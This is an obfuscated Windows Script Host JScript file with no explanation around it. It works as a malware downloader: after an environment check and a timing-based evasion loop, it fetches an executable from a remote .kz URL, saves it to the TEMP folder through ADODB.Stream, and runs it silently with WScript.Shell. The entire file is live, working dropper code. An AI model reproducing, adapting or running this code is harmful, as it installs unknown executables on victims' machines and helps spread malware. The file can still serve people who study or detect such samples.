var GD = false;
var JO = "Create"+"Object";
var Y = function RX() {return WScript[JO]("WScript"+".Shell");}(), V = 11;
var M = "MSXML2"+".XMLHTTP";
var BM = 2;
var J = BM - 2;
function YC(N){Y["Run"](N, J, J);};
function VX(){return M + "";};
function JQ(K0, O){J = J * 1; return K0 - O;};
function C(){return JO;};
/*@cc_on
  @if (@_win32 || @_win64)
    GD = true;
  @end
@*/
if (GD)
{
var K = "";
function FG(){return 22;};
var QH = 0; var E0 = 0;
function IB()
{
var P0 = new this["Date"]();
var C0 = P0["getUTCMilliseconds"]();
WScript["Sleep"](FG());
var P0 = new this["Date"]();
var BU = P0["getUTCMilliseconds"]();
WScript["Sleep"](FG());
var P0 = new this["Date"]();
var IM = P0["getUTCMilliseconds"]();
var QH = "MY";
QH = JQ(BU, C0);
var E0 = "P";
E0 = JQ(IM, BU);
K = "open";
return JQ(QH, E0);
}
var D = false;
var C1 = false;
for (var L = J; L < FG() * 1; L++){if (IB() != J){
D = true; 
E0 = "31" + 11 * QH + E0; 
C1 = true; 
break;
}}
function CE() {return ((D == true) && (D == C1)) ? 1 : J;};
if (D && CE() && C1){
function E() {return Y["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "zS2TzQEhTFJaqc.ex" + "e";};
 SS = VX();
 FP = WScript[JO](SS);
 var H = 1;
do { 
	for (;H;){
	try {
		if (H == 1)
		{
			FP[K]("GET", "http://vtdrive.kz/f6dh1a", false);
			FP["send"]();
			JF = "Sleep";
			H = 2;
		}
		WScript[JF](FG() + 120); 
		if (FP["readystate"] < 2 * 2) continue;
		H = J;
		function JM(Q) {var LB = (1, 2, 3, 4, 5, Q); return LB;};
		P1 = WScript[C()]("ADODB.Stream");
		SS = P1;
		SS[K]();
		SS["type"] = JM(1);
		SS["write"](FP["ResponseBody"]);
		P1["position"] = JM(J);
		SS["Save" + "ToFile"](E(), 2);
		P1["cl"+"ose"]();
		BN = E();
		YC(BN);
	} catch(UQ){};};
}while (H);
}
}

